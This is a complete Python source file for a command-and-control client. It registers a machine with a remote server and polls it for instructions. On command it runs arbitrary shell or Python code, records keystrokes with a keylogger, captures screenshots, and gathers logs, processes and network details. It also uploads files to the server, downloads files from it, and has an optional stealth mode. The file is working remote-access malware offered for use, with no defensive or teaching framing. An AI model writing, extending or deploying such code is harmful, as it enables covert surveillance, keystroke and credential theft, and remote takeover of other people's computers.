#!/usr/bin/env python3
"""
Advanced C2 Client
A comprehensive client that can run commands, take screenshots, collect logs, and perform various system operations
"""

import requests
import json
import time
import platform
import socket
import subprocess
import threading
import uuid
import base64
import os
import sys
import psutil
import logging
from datetime import datetime
from pathlib import Path
import argparse
import signal
import hashlib
import zipfile
import tempfile
import shutil

# Try to import optional dependencies
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pynput
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

class AdvancedC2Client:
    def __init__(self, server_url="http://localhost:8000", client_id=None, stealth_mode=False):
        self.server_url = server_url
        self.client_id = client_id or "client_{}".format(uuid.uuid4().hex[:8])
        self.session = requests.Session()
        self.running = False
        self.stealth_mode = stealth_mode
        self.keylogger_active = False
        self.keylogger_thread = None
        self.logged_keys = []
        
        # Setup logging
        self.setup_logging()
        
        # Create temp directory for client operations
        self.temp_dir = tempfile.mkdtemp(prefix="c2_client_")
        self.logger.info("Client temp directory: {}".format(self.temp_dir))
        
    def setup_logging(self):
        """Setup logging for the client"""
        log_file = os.path.join(self.temp_dir, "client.log") if hasattr(self, 'temp_dir') else "client.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def get_system_info(self):
        """Get comprehensive system information"""
        try:
            hostname = socket.gethostname()
            username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
            os_info = "{} {} {}".format(platform.system(), platform.release(), platform.version())
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except Exception:
                ip_address = "127.0.0.1"
            finally:
                s.close()
            
            # Get additional system info
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            system_info = {
                "agent_id": self.client_id,  # Changed from client_id to agent_id
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "ip_address": ip_address,
                "port": 0,
                "cpu_count": cpu_count,
                "memory_total": memory.total,
                "memory_available": memory.available,
                "disk_total": disk.total,
                "disk_free": disk.free,
                "python_version": sys.version,
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "boot_time": psutil.boot_time(),
                "pid": os.getpid(),
                "cwd": os.getcwd()
            }
            
            return system_info
        except Exception as e:
            self.logger.error("Error getting system info: {}".format(e))
            return None
    
    def register(self):
        """Register with the C2 server"""
        system_info = self.get_system_info()
        if not system_info:
            return False

        try:
            # Register directly without authentication
            response = self.session.post(
                "{}/api/agents/register".format(self.server_url),
                json=system_info
            )

            if response.status_code == 200:
                self.logger.info("Successfully registered as client {}".format(self.client_id))
                return True
            else:
                self.logger.error("Registration failed: {}".format(response.text))
                return False
        except Exception as e:
            self.logger.error("Registration error: {}".format(e))
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            response = self.session.post(
                "{}/api/agents/{}/heartbeat".format(self.server_url, self.client_id)
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Heartbeat error: {}".format(e))
            return False
    
    def get_commands(self):
        """Get pending commands from server"""
        try:
            response = self.session.get(
                "{}/api/commands/{}".format(self.server_url, self.client_id)
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("commands", [])
            else:
                return []
        except Exception as e:
            self.logger.error("Error getting commands: {}".format(e))
            return []
    
    def execute_command(self, command, command_type="shell"):
        """Execute a command and return result"""
        try:
            if command_type == "shell":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout + result.stderr
                success = result.returncode == 0
                
                return {
                    "result": output,
                    "success": success,
                    "return_code": result.returncode
                }
            elif command_type == "python":
                # Execute Python code
                try:
                    exec_globals = {"__builtins__": __builtins__}
                    exec_locals = {}
                    exec(command, exec_globals, exec_locals)
                    return {
                        "result": "Python code executed successfully",
                        "success": True,
                        "return_code": 0
                    }
                except Exception as e:
                    return {
                        "result": "Python execution error: {}".format(str(e)),
                        "success": False,
                        "return_code": 1
                    }
            else:
                return {
                    "result": "Unknown command type: {}".format(command_type),
                    "success": False,
                    "return_code": 1
                }
        except subprocess.TimeoutExpired:
            return {
                "result": "Command timed out",
                "success": False,
                "return_code": 124
            }
        except Exception as e:
            return {
                "result": "Error executing command: {}".format(str(e)),
                "success": False,
                "return_code": 1
            }
    
    def take_screenshot(self):
        """Take a screenshot and return base64 encoded image"""
        if not PIL_AVAILABLE:
            return {
                "result": "PIL not available. Install with: pip install Pillow",
                "success": False
            }
        
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            
            # Save to temp file
            screenshot_path = os.path.join(self.temp_dir, "screenshot_{}.png".format(int(time.time())))
            screenshot.save(screenshot_path)
            
            # Convert to base64
            with open(screenshot_path, "rb") as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Clean up temp file
            os.remove(screenshot_path)
            
            return {
                "result": "Screenshot captured successfully",
                "success": True,
                "image_data": image_data,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {
                "result": "Screenshot error: {}".format(str(e)),
                "success": False
            }
    
    def get_system_logs(self, log_type="system", lines=100):
        """Get system logs"""
        try:
            if platform.system() == "Windows":
                if log_type == "system":
                    cmd = "Get-WinEvent -LogName System -MaxEvents {}".format(lines)
                    result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
                elif log_type == "application":
                    cmd = "Get-WinEvent -LogName Application -MaxEvents {}".format(lines)
                    result = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
                else:
                    return {"result": "Unknown log type for Windows", "success": False}
            else:
                if log_type == "system":
                    result = subprocess.run(["journalctl", "-n", str(lines)], capture_output=True, text=True)
                elif log_type == "auth":
                    result = subprocess.run(["journalctl", "-u", "ssh", "-n", str(lines)], capture_output=True, text=True)
                else:
                    result = subprocess.run(["tail", "-n", str(lines), "/var/log/syslog"], capture_output=True, text=True)
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "log_type": log_type,
                "lines": lines
            }
        except Exception as e:
            return {
                "result": "Log collection error: {}".format(str(e)),
                "success": False
            }
    
    def get_processes(self):
        """Get running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):
                try:
                    proc_info = proc.info
                    proc_info['create_time'] = datetime.fromtimestamp(proc_info['create_time']).isoformat()
                    processes.append(proc_info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            return {
                "result": "Process list retrieved",
                "success": True,
                "processes": processes,
                "count": len(processes)
            }
        except Exception as e:
            return {
                "result": "Process enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_network_info(self):
        """Get network information"""
        try:
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                connections.append({
                    'fd': conn.fd,
                    'family': conn.family.name,
                    'type': conn.type.name,
                    'laddr': conn.laddr,
                    'raddr': conn.raddr,
                    'status': conn.status,
                    'pid': conn.pid
                })
            
            interfaces = []
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {'name': interface, 'addresses': []}
                for addr in addrs:
                    interface_info['addresses'].append({
                        'family': addr.family.name,
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
                interfaces.append(interface_info)
            
            return {
                "result": "Network info retrieved",
                "success": True,
                "connections": connections,
                "interfaces": interfaces
            }
        except Exception as e:
            return {
                "result": "Network info error: {}".format(str(e)),
                "success": False
            }
    
    def start_keylogger(self):
        """Start keylogger"""
        if not KEYLOGGER_AVAILABLE:
            return {
                "result": "Keylogger not available. Install with: pip install pynput",
                "success": False
            }
        
        if self.keylogger_active:
            return {
                "result": "Keylogger already active",
                "success": False
            }
        
        try:
            self.keylogger_active = True
            self.keylogger_thread = threading.Thread(target=self._keylogger_worker)
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
            
            return {
                "result": "Keylogger started",
                "success": True
            }
        except Exception as e:
            return {
                "result": "Keylogger start error: {}".format(str(e)),
                "success": False
            }
    
    def stop_keylogger(self):
        """Stop keylogger"""
        if not self.keylogger_active:
            return {
                "result": "Keylogger not active",
                "success": False
            }
        
        try:
            self.keylogger_active = False
            if self.keylogger_thread:
                self.keylogger_thread.join(timeout=1)
            
            return {
                "result": "Keylogger stopped",
                "success": True,
                "logged_keys": len(self.logged_keys)
            }
        except Exception as e:
            return {
                "result": "Keylogger stop error: {}".format(str(e)),
                "success": False
            }
    
    def _keylogger_worker(self):
        """Keylogger worker thread"""
        def on_press(key):
            if self.keylogger_active:
                try:
                    key_str = str(key).replace("'", "")
                    self.logged_keys.append({
                        "key": key_str,
                        "timestamp": datetime.now().isoformat()
                    })
                except Exception:
                    pass
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    
    def get_keylog_data(self):
        """Get keylog data"""
        return {
            "result": "Keylog data retrieved",
            "success": True,
            "keys": self.logged_keys,
            "count": len(self.logged_keys)
        }
    
    def upload_file(self, file_path):
        """Upload a file to the server"""
        try:
            if not os.path.exists(file_path):
                return {
                    "result": "File not found: {}".format(file_path),
                    "success": False
                }
            
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = self.session.post(
                    "{}/api/files/upload".format(self.server_url),
                    files=files
                )
            
            if response.status_code == 200:
                return {
                    "result": "File uploaded successfully",
                    "success": True,
                    "filename": os.path.basename(file_path)
                }
            else:
                return {
                    "result": "Upload failed: {}".format(response.text),
                    "success": False
                }
        except Exception as e:
            return {
                "result": "Upload error: {}".format(str(e)),
                "success": False
            }
    
    def download_file(self, filename, save_path=None):
        """Download a file from the server"""
        try:
            if not save_path:
                save_path = os.path.join(self.temp_dir, filename)
            
            response = self.session.get(
                "{}/api/files/download/{}".format(self.server_url, filename)
            )
            
            if response.status_code == 200:
                with open(save_path, "wb") as f:
                    f.write(response.content)
                
                return {
                    "result": "File downloaded successfully",
                    "success": True,
                    "path": save_path
                }
            else:
                return {
                    "result": "Download failed: {}".format(response.text),
                    "success": False
                }
        except Exception as e:
            return {
                "result": "Download error: {}".format(str(e)),
                "success": False
            }
    
    def submit_result(self, command_id, result, success, additional_data=None):
        """Submit command result to server"""
        try:
            result_data = {
                "agent_id": self.client_id,
                "command_id": command_id,
                "result": result,
                "success": success,
                "timestamp": datetime.utcnow().isoformat()
            }
            
            if additional_data:
                result_data.update(additional_data)
            
            response = self.session.post(
                "{}/api/commands/result".format(self.server_url),
                json=result_data
            )
            
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Error submitting result: {}".format(e))
            return False
    
    def process_commands(self):
        """Process pending commands"""
        commands = self.get_commands()
        
        for cmd in commands:
            if cmd.get("status") == "pending":
                self.logger.info("Executing command: {}".format(cmd['command']))
                
                command_type = cmd.get("command_type", "shell")
                command_text = cmd['command']
                
                # Handle special commands
                if command_text.startswith("SCREENSHOT"):
                    result_data = self.take_screenshot()
                elif command_text.startswith("LOGS"):
                    parts = command_text.split()
                    log_type = parts[1] if len(parts) > 1 else "system"
                    lines = int(parts[2]) if len(parts) > 2 else 100
                    result_data = self.get_system_logs(log_type, lines)
                elif command_text.startswith("PROCESSES"):
                    result_data = self.get_processes()
                elif command_text.startswith("NETWORK"):
                    result_data = self.get_network_info()
                elif command_text.startswith("KEYLOG_START"):
                    result_data = self.start_keylogger()
                elif command_text.startswith("KEYLOG_STOP"):
                    result_data = self.stop_keylogger()
                elif command_text.startswith("KEYLOG_DATA"):
                    result_data = self.get_keylog_data()
                elif command_text.startswith("UPLOAD"):
                    file_path = command_text.split(" ", 1)[1] if " " in command_text else ""
                    result_data = self.upload_file(file_path)
                elif command_text.startswith("DOWNLOAD"):
                    filename = command_text.split(" ", 1)[1] if " " in command_text else ""
                    result_data = self.download_file(filename)
                else:
                    result_data = self.execute_command(command_text, command_type)
                
                self.submit_result(
                    cmd["command_id"],
                    result_data["result"],
                    result_data["success"],
                    result_data
                )
                
                self.logger.info("Command result: {}".format(result_data['success']))
    
    def cleanup(self):
        """Cleanup resources"""
        try:
            if self.keylogger_active:
                self.stop_keylogger()
            
            # Clean up temp directory
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            
            self.logger.info("Client cleanup completed")
        except Exception as e:
            self.logger.error("Cleanup error: {}".format(e))
    
    def run(self):
        """Main client loop"""
        self.logger.info("Starting Advanced C2 Client {}".format(self.client_id))
        
        # Register with server
        if not self.register():
            self.logger.error("Failed to register with server. Exiting.")
            return
        
        self.running = True
        
        # Setup signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            self.logger.info("Received signal {}, shutting down...".format(signum))
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            while self.running:
                # Send heartbeat
                self.send_heartbeat()
                
                # Process commands
                self.process_commands()
                
                # Wait before next iteration
                time.sleep(5)
                
        except KeyboardInterrupt:
            self.logger.info("Client stopped by user")
        except Exception as e:
            self.logger.error("Client error: {}".format(e))
        finally:
            self.running = False
            self.cleanup()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Advanced C2 Client")
    parser.add_argument("--server", default="http://localhost:8000", help="C2 Server URL")
    parser.add_argument("--client-id", help="Custom client ID")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    
    args = parser.parse_args()
    
    client = AdvancedC2Client(
        server_url=args.server,
        client_id=args.client_id,
        stealth_mode=args.stealth
    )
    
    try:
        client.run()
    except Exception as e:
        print("Client error: {}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
